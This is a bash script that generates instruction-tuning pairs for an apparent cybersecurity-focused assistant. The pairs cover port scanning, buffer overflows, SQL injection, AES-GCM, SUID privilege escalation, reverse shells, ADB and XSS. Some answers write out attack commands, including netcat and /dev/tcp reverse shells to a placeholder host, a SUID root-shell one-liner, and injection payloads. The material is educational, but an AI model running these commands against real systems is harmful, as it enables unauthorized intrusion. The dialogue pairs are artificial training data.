#!/bin/bash
# Generate instruction fine-tuning data for NanoMind
# Format: <|sys|>SYSTEM<|eos|><|user|>PROMPT<|eos|><|assistant|>RESPONSE<|eos|>

SYS="You are NanoMind, an AI assistant specialized in cybersecurity, ethical hacking, Linux, Rust programming, and CTF challenges. You provide accurate technical information for educational purposes."

OUT="data/instruct.txt"
mkdir -p data
> "$OUT"

write_example() {
  echo "<|sys|>" >> "$OUT"
  echo "$SYS" >> "$OUT"
  echo "<|eos|>" >> "$OUT"
  echo "<|user|>" >> "$OUT"
  echo "$1" >> "$OUT"
  echo "<|eos|>" >> "$OUT"
  echo "<|assistant|>" >> "$OUT"
  echo "$2" >> "$OUT"
  echo "<|eos|>" >> "$OUT"
  echo "" >> "$OUT"
}

# Security examples
write_example \
  "What does nmap -sS -sV -O -p- do?" \
  "-sS: TCP SYN scan (stealth, doesn't complete handshake). -sV: probe open ports for service/version info. -O: OS fingerprinting via TCP/IP stack behavior. -p-: scan all 65535 ports instead of default 1000. Combined: full stealth port scan with service detection and OS guess."

write_example \
  "Explain a stack buffer overflow in simple terms" \
  "A stack buffer overflow happens when a program writes more bytes into a fixed-size stack array than it can hold. The extra bytes overwrite adjacent memory, including the saved return address. When the function returns, it jumps to the attacker-controlled address instead of the legitimate caller. This lets an attacker redirect execution to shellcode or ROP gadgets."

write_example \
  "How do I scan for open ports on my own network in Termux?" \
  "Install nmap first: pkg install nmap. Then: nmap -sn 192.168.1.0/24 discovers live hosts. nmap -sV 192.168.1.1 scans a specific host with version detection. Note: only scan networks you own or have explicit permission to test."

write_example \
  "Write a Rust TCP port scanner" \
  'use std::net::TcpStream;
use std::time::Duration;

fn scan_port(host: &str, port: u16) -> bool {
    let addr = format!("{}:{}", host, port);
    TcpStream::connect_timeout(
        &addr.parse().unwrap(),
        Duration::from_millis(200)
    ).is_ok()
}

fn main() {
    let host = "127.0.0.1";
    for port in 1..=1024 {
        if scan_port(host, port) {
            println!("Open: {}", port);
        }
    }
}'

write_example \
  "What is SQL injection and how is it prevented?" \
  "SQL injection occurs when user input is concatenated directly into SQL queries. Example: query = 'SELECT * FROM users WHERE name=' + input. Attacker inputs: ' OR '1'='1 making query return all rows. Prevention: use parameterized queries. Example in Python: cursor.execute('SELECT * FROM users WHERE name=?', (input,)). The placeholder is handled by the database driver, which never interprets input as SQL."

write_example \
  "How does AES-GCM work and why is nonce reuse dangerous?" \
  "AES-GCM provides authenticated encryption. It uses AES in CTR mode for encryption, producing a keystream XORed with plaintext. The GHASH function produces an authentication tag over ciphertext and associated data. Nonce reuse is catastrophic: if same (key, nonce) pair encrypts two messages, attacker can XOR ciphertexts to cancel keystream and recover plaintext differences. The authentication key can also be recovered. Always use random 96-bit nonce."

write_example \
  "Explain SUID exploitation for privilege escalation" \
  "SUID binaries run with the owner privileges (often root) regardless of who executes them. Find them: find / -perm -4000 -type f 2>/dev/null. If /usr/bin/find has SUID root, run: find . -exec /bin/sh -p ; to get a root shell. GTFOBins lists exploitable SUID binaries. Always verify SUID: ls -la — look for s in owner execute position."

write_example \
  "What is a reverse shell and how do I set one up with netcat?" \
  "A reverse shell makes the target machine connect back to your machine, useful when target is behind a firewall. On your machine: nc -lvnp 4444 — listen. On target: nc YOUR_IP 4444 -e /bin/bash — connects back and provides shell. If nc doesn't support -e: bash -i >& /dev/tcp/YOUR_IP/4444 0>&1. Only use on systems you own or have permission to test."

write_example \
  "How do I use ADB to debug an Android app?" \
  "Enable USB debugging in Developer Options. Connect phone via USB. adb devices — verify connection. adb logcat — stream system logs (filter: adb logcat | grep YourApp). adb shell — interactive shell on device. adb shell dumpsys activity — running activities. adb shell pm list packages — installed packages. adb install -r app.apk — install/reinstall APK."

write_example \
  "What is XSS and how do I test for it?" \
  "Cross-site scripting (XSS) injects JavaScript into pages viewed by others. Reflected XSS: in URL parameters. Stored XSS: saved in database. DOM XSS: client-side JavaScript. Test: inject <script>alert(1)</script> into input fields. Bypasses: encoding tricks, CSP bypass, event handlers. Prevention: escape output, use Content-Security-Policy headers, sanitize input."

echo "Instruct data written: $(wc -l < $OUT) lines to $OUT"
